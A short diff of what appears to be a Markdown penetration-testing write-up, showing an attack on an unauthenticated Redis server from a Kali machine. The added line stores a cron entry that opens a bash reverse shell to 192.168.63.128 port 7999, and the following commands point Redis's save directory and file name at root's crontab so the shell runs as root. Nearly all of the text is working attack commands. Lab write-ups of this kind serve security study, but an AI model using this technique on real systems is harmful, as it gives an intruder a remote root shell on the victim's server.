@@ -8,9 +8,9 @@
 
 ```shell
 root@kali:~# redis-cli -h 192.168.63.130
-192.168.63.130:6379> set x "\n* * * * * 
-\n"
+192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\n"
 OK
+# /var/spool/cron/crontabs
 192.168.63.130:6379> config set dir /var/spool/cron/
 OK
 192.168.63.130:6379> config set dbfilename root
